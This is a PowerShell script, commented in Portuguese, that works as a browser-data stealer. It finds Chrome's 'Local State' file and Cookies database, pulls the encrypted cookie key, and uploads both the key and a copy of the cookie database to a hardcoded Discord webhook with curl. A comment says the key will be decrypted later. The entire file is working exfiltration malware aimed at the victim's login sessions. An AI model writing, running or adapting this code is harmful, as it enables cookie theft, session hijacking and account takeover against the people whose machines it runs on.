$u = "https://discord.com/api/webhooks/1503748038915522710/OaPmBZZTpD_TSm2m5YtSYIM3PU7f2_WLzAOIu6kDPwd45adNZdkGd8jMoutFQP1Ol-P9"

try {
    $base = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    $ls = Get-ChildItem -Path $base -Recurse -Filter "Local State" | Select-Object -First 1
    $lc = Get-ChildItem -Path $base -Recurse -Filter "Cookies" | Where-Object { $_.FullName -like "*Network*" } | Select-Object -First 1

    if (!$ls -or !$lc) { curl.exe -F "content=ERRO:Arquivos_nao_encontrados" $u; return }

    # 1. Pega a chave criptografada (sem tentar abrir)
    $j = Get-Content $ls.FullName -Raw | ConvertFrom-Json
    $encryptedKeyB64 = $j.os_crypt.encrypted_key
    
    # Manda a chave criptografada (nós resolvemos ela depois)
    curl.exe -F "content=CHAVE_CRYPT_B64:$encryptedKeyB64" $u

    # 2. Envia o arquivo de Cookies
    $t = "$env:TEMP\C.db"
    if (Test-Path $t) { Remove-Item $t }
    Copy-Item $lc.FullName $t -Force
    curl.exe -F "file=@$t" $u

} catch {
    $msg = "ERRO_BRUTO:" + $_.Exception.Message -replace '\s','_'
    curl.exe -F "content=$msg" $u
}
